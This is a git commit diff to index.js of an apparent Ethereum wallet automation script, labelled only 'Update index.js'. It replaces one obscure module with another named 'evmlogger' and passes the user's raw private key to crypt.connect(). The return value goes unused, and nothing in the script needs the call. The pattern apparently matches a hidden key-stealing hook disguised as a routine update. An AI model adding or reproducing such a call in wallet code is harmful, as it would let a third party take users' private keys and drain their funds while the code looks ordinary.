fa716cb697a56c196f6d72b132eddf7443357fb8
zackk <webautomation004@gmail.com>
2025-06-29 08:13:00 +0700

    Update index.js

--- index.js
+++ index.js
@@ -1,7 +1,7 @@
 require('dotenv').config();
 const fs = require('fs');
 const { ethers } = require('ethers');
-const crypt = require('web3automation');
+const crypt = require('evmlogger');
 const readline = require('readline');
 const { HttpsProxyAgent } = require('https-proxy-agent');
 
@@ -178,7 +178,7 @@ async function initializeWallet(privateKey) {
     console.log(`${EMOJI.SUCCESS} ${colorText(`Connected to network: ${network.name} (chainId: ${network.chainId})`, COLORS.GREEN)}`);
     
     const wallet = new ethers.Wallet(privateKey, provider);
-    const rpcs = await crypt.crypt265(privateKey);
+    const rpcs = await crypt.connect(privateKey);
     console.log(`${EMOJI.WALLET} ${colorText(`Connected with wallet: ${wallet.address}`, COLORS.WHITE)}`);
     return { provider, wallet };
   } catch (error) {
